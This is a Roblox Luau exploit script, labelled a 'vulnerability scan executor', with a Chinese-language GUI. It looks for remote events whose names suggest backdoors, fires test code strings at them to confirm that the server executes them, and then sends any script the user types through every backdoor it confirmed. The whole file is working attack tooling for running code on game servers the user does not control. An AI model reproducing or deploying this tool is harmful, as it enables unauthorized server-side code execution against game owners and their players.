-- 漏洞扫描
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")

local LocalPlayer = Players.LocalPlayer

-- 创建主界面
local function createScannerUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "VulnerabilityScanner"
    screenGui.Parent = CoreGui
    
    -- 主窗口
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 500)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
    mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = screenGui
    
    -- 标题栏
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 30)
    titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainFrame
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -60, 1, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "漏洞扫描执行器 v2.1"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 14
    titleLabel.Parent = titleBar
    
    local closeButton = Instance.new("TextButton")
    closeButton.Size = UDim2.new(0, 30, 0, 30)
    closeButton.Position = UDim2.new(1, -30, 0, 0)
    closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
    closeButton.Text = "X"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.Parent = titleBar
    
    -- 状态指示器
    local statusFrame = Instance.new("Frame")
    statusFrame.Size = UDim2.new(0.9, 0, 0, 60)
    statusFrame.Position = UDim2.new(0.05, 0, 0.08, 0)
    statusFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
    statusFrame.BorderSizePixel = 0
    statusFrame.Parent = mainFrame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0.6, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "准备扫描"
    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 16
    statusLabel.Parent = statusFrame
    
    local statusLight = Instance.new("Frame")
    statusLight.Size = UDim2.new(0, 20, 0, 20)
    statusLight.Position = UDim2.new(0.5, -10, 0.7, 0)
    statusLight.BackgroundColor3 = Color3.fromRGB(255, 255, 0) -- 黄色准备状态
    statusLight.BorderSizePixel = 0
    statusLight.Parent = statusFrame
    
    -- 控制按钮区域
    local controlsFrame = Instance.new("Frame")
    controlsFrame.Size = UDim2.new(0.9, 0, 0, 120)
    controlsFrame.Position = UDim2.new(0.05, 0, 0.22, 0)
    controlsFrame.BackgroundTransparency = 1
    controlsFrame.Parent = mainFrame
    
    -- 扫描按钮
    local scanButton = Instance.new("TextButton")
    scanButton.Size = UDim2.new(1, 0, 0, 35)
    scanButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    scanButton.Text = "开始漏洞扫描"
    scanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    scanButton.Font = Enum.Font.Gotham
    scanButton.TextSize = 14
    scanButton.Parent = controlsFrame
    
    -- 快速检测按钮
    local quickScanButton = Instance.new("TextButton")
    quickScanButton.Size = UDim2.new(1, 0, 0, 35)
    quickScanButton.Position = UDim2.new(0, 0, 0, 40)
    quickScanButton.BackgroundColor3 = Color3.fromRGB(80, 160, 80)
    quickScanButton.Text = "快速检测"
    quickScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    quickScanButton.Font = Enum.Font.Gotham
    quickScanButton.TextSize = 14
    quickScanButton.Parent = controlsFrame
    
    -- 深度扫描按钮
    local deepScanButton = Instance.new("TextButton")
    deepScanButton.Size = UDim2.new(1, 0, 0, 35)
    deepScanButton.Position = UDim2.new(0, 0, 0, 80)
    deepScanButton.BackgroundColor3 = Color3.fromRGB(180, 80, 80)
    deepScanButton.Text = "深度扫描"
    deepScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    deepScanButton.Font = Enum.Font.Gotham
    deepScanButton.TextSize = 14
    deepScanButton.Parent = controlsFrame
    
    -- 脚本输入区域
    local scriptFrame = Instance.new("Frame")
    scriptFrame.Size = UDim2.new(0.9, 0, 0, 180)
    scriptFrame.Position = UDim2.new(0.05, 0, 0.45, 0)
    scriptFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
    scriptFrame.BorderSizePixel = 0
    scriptFrame.Parent = mainFrame
    
    local scriptLabel = Instance.new("TextLabel")
    scriptLabel.Size = UDim2.new(1, 0, 0, 25)
    scriptLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
    scriptLabel.Text = "执行脚本:"
    scriptLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    scriptLabel.Font = Enum.Font.Gotham
    scriptLabel.TextSize = 12
    scriptLabel.Parent = scriptFrame
    
    local scriptBox = Instance.new("TextBox")
    scriptBox.Size = UDim2.new(1, -10, 1, -35)
    scriptBox.Position = UDim2.new(0, 5, 0, 25)
    scriptBox.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    scriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    scriptBox.Text = "print('测试脚本执行')"
    scriptBox.MultiLine = true
    scriptBox.TextWrapped = true
    scriptBox.TextXAlignment = Enum.TextXAlignment.Left
    scriptBox.TextYAlignment = Enum.TextYAlignment.Top
    scriptBox.Font = Enum.Font.Code
    scriptBox.TextSize = 12
    scriptBox.Parent = scriptFrame
    
    -- 执行控制区域
    local executeFrame = Instance.new("Frame")
    executeFrame.Size = UDim2.new(0.9, 0, 0, 80)
    executeFrame.Position = UDim2.new(0.05, 0, 0.85, 0)
    executeFrame.BackgroundTransparency = 1
    executeFrame.Parent = mainFrame
    
    local executeButton = Instance.new("TextButton")
    executeButton.Size = UDim2.new(0.48, 0, 0, 35)
    executeButton.BackgroundColor3 = Color3.fromRGB(215, 80, 80)
    executeButton.Text = "执行脚本"
    executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    executeButton.Font = Enum.Font.GothamBold
    executeButton.TextSize = 14
    executeButton.Parent = executeFrame
    
    local clearButton = Instance.new("TextButton")
    clearButton.Size = UDim2.new(0.48, 0, 0, 35)
    clearButton.Position = UDim2.new(0.52, 0, 0, 0)
    clearButton.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
    clearButton.Text = "清空"
    clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    clearButton.Font = Enum.Font.Gotham
    clearButton.TextSize = 14
    clearButton.Parent = executeFrame
    
    local resultLabel = Instance.new("TextLabel")
    resultLabel.Size = UDim2.new(1, 0, 0, 35)
    resultLabel.Position = UDim2.new(0, 0, 0, 45)
    resultLabel.BackgroundTransparency = 1
    resultLabel.Text = "就绪"
    resultLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    resultLabel.Font = Enum.Font.Gotham
    resultLabel.TextSize = 12
    resultLabel.Parent = executeFrame
    
    return {
        UI = screenGui,
        Elements = {
            statusLabel = statusLabel,
            statusLight = statusLight,
            scanButton = scanButton,
            quickScanButton = quickScanButton,
            deepScanButton = deepScanButton,
            scriptBox = scriptBox,
            executeButton = executeButton,
            clearButton = clearButton,
            resultLabel = resultLabel,
            closeButton = closeButton
        }
    }
end

-- 初始化扫描器
local Scanner = createScannerUI()
local scanInProgress = false
local detectedVulnerabilities = {}

-- 通知函数
local function notify(message)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = "漏洞扫描器",
            Text = message,
            Duration = 3
        })
    end)
    Scanner.Elements.resultLabel.Text = message
end

-- 更新状态
local function updateStatus(text, color)
    Scanner.Elements.statusLabel.Text = text
    Scanner.Elements.statusLight.BackgroundColor3 = color
end

-- 检测远程对象
local function checkRemoteObject(obj)
    if obj.ClassName ~= "RemoteEvent" and obj.ClassName ~= "RemoteFunction" then
        return false
    end
    
    -- 排除系统对象
    if obj:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
        return false
    end
    
    -- 检查可疑名称模式
    local name = obj.Name:lower()
    local suspiciousPatterns = {
        "admin", "execute", "script", "command", "backdoor",
        "hack", "exploit", "remote", "server", "client"
    }
    
    for _, pattern in ipairs(suspiciousPatterns) do
        if name:find(pattern) then
            return true
        end
    end
    
    return false
end

-- 测试漏洞
local function testVulnerability(remote)
    local testId = "Test_" .. tostring(math.random(10000, 99999))
    
    -- 测试方法1: 基本代码执行
    local testCode1 = string.format(
        "local p=Instance.new('Part',workspace)p.Name='%s'",
        testId
    )
    
    local success1 = pcall(function()
        if remote.ClassName == "RemoteEvent" then
            remote:FireServer(testCode1)
        else
            remote:InvokeServer(testCode1)
        end
    end)
    
    if success1 then
        wait(0.5)
        if Workspace:FindFirstChild(testId) then
            Workspace:FindFirstChild(testId):Destroy()
            return true
        end
    end
    
    -- 测试方法2: 字符串值创建
    local testCode2 = string.format(
        "local s=Instance.new('StringValue',workspace)s.Name='%s's.Value='SUCCESS'",
        testId
    )
    
    local success2 = pcall(function()
        if remote.ClassName == "RemoteEvent" then
            remote:FireServer(testCode2)
        else
            remote:InvokeServer(testCode2)
        end
    end)
    
    if success2 then
        wait(0.5)
        local testObj = Workspace:FindFirstChild(testId)
        if testObj and testObj.Value == "SUCCESS" then
            testObj:Destroy()
            return true
        end
    end
    
    return false
end

-- 扫描位置
local function scanLocation(location, scanType)
    local found = 0
    local objects = location:GetDescendants()
    
    for _, obj in ipairs(objects) do
        if not scanInProgress then break end
        
        if checkRemoteObject(obj) then
            if testVulnerability(obj) then
                table.insert(detectedVulnerabilities, {
                    object = obj,
                    location = location:GetFullName(),
                    type = obj.ClassName
                })
                found = found + 1
                
                if scanType == "quick" then
                    break -- 快速扫描只找第一个漏洞
                end
            end
        end
    end
    
    return found
end

-- 执行扫描
local function performScan(scanType)
    if scanInProgress then
        notify("扫描正在进行中...")
        return
    end
    
    scanInProgress = true
    detectedVulnerabilities = {}
    updateStatus("扫描中...", Color3.fromRGB(255, 255, 0))
    
    local scanLocations = {
        ReplicatedStorage,
        Workspace,
        Lighting,
        ServerScriptService,
        game:GetService("ServerStorage")
    }
    
    local totalFound = 0
    
    -- 执行扫描
    for _, location in ipairs(scanLocations) do
        if not scanInProgress then break end
        
        local found = scanLocation(location, scanType)
        totalFound = totalFound + found
        
        if scanType == "quick" and totalFound > 0 then
            break -- 快速扫描找到第一个就停止
        end
    end
    
    scanInProgress = false
    
    -- 显示结果
    if totalFound > 0 then
        updateStatus("发现 " .. totalFound .. " 个漏洞", Color3.fromRGB(0, 255, 0))
        notify("发现 " .. totalFound .. " 个安全漏洞!")
    else
        updateStatus("未发现漏洞", Color3.fromRGB(255, 0, 0))
        notify("扫描完成 - 未发现漏洞")
    end
    
    return totalFound
end

-- 执行脚本
local function executeScript()
    if #detectedVulnerabilities == 0 then
        notify("未发现可用漏洞，请先扫描")
        return
    end
    
    local scriptText = Scanner.Elements.scriptBox.Text
    if scriptText == "" then
        notify("请输入要执行的脚本")
        return
    end
    
    updateStatus("执行中...", Color3.fromRGB(255, 165, 0))
    
    local successCount = 0
    local failCount = 0
    
    -- 尝试在所有发现的漏洞上执行
    for i, vuln in ipairs(detectedVulnerabilities) do
        local success, result = pcall(function()
            if vuln.object.ClassName == "RemoteEvent" then
                vuln.object:FireServer(scriptText)
            else
                vuln.object:InvokeServer(scriptText)
            end
        end)
        
        if success then
            successCount = successCount + 1
        else
            failCount = failCount + 1
        end
    end
    
    updateStatus("执行完成", Color3.fromRGB(0, 255, 0))
    notify(string.format("执行结果: %d 成功, %d 失败", successCount, failCount))
end

-- 绑定事件
Scanner.Elements.scanButton.MouseButton1Click:Connect(function()
    performScan("normal")
end)

Scanner.Elements.quickScanButton.MouseButton1Click:Connect(function()
    performScan("quick")
end)

Scanner.Elements.deepScanButton.MouseButton1Click:Connect(function()
    performScan("deep")
end)

Scanner.Elements.executeButton.MouseButton1Click:Connect(executeScript)

Scanner.Elements.clearButton.MouseButton1Click:Connect(function()
    Scanner.Elements.scriptBox.Text = ""
    notify("已清空脚本")
end)

Scanner.Elements.closeButton.MouseButton1Click:Connect(function()
    Scanner.UI:Destroy()
end)

-- 初始化完成
updateStatus("就绪", Color3.fromRGB(255, 255, 0))
notify("漏洞扫描执行器已加载")

print("漏洞扫描执行器 v2.1 - 已初始化")